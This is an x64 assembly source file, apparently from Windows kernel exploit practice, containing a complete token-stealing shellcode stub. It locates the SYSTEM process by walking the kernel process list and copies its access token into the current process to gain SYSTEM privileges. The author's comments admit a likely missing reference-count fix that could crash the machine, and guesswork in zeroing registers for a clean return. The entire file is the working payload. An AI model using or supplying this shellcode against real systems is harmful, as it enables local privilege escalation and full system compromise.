PUBLIC GetToken
; Rewritten for Kernel Version 10.0.10240
; Start of Token Stealing Stub
.code
GetToken   proc
xor rax, rax                    ; Set ZERO
mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread
                                ; _KTHREAD is located at GS : [0x188]

mov rax, [rax + 220h]            ; Get nt!_KTHREAD.Process or nt!_KTHREAD.ApcState.Process at 0b8h
mov rcx, rax                    ; Copy current process _EPROCESS structure
mov r11, rcx                    ; Store Token.RefCnt
and r11, 7

mov rdx, 4h                     ; SYSTEM process PID = 0x4

SearchSystemPID:
mov rax, [rax + 2f0h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 2e8h
cmp[rax + 2e0h], rdx            ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov rdx, [rax + 358h]           ; Get SYSTEM process nt!_EPROCESS.Token
and rdx, 0fffffffffffffff0h
or rdx, r11
mov[rcx + 358h], rdx            ; Replace target process nt!_EPROCESS.Token
                                ; with SYSTEM process nt!_EPROCESS.Token
                                ; End of Token Stealing Stub

; We still need to reconstruct a valid response
xor rax, rax                    ; Set NTSTATUS SUCCESS

;I think I'm missing reference counter adjustment so this will likely BSOD after the process terminates???

; These registers need to be zeroed out, although I don't know the exact reason, a good general strategy would be
; to keep a note on all register values when you make a safe call and then see which registers get mangled values
; A good start would be zeroeing out the registers that are zero when you submit safe input, in our case, that was
; registers rsi and rdi
xor rsi, rsi
xor rdi, rdi

; Recreate the instructions that would've been execute
GetToken ENDP
END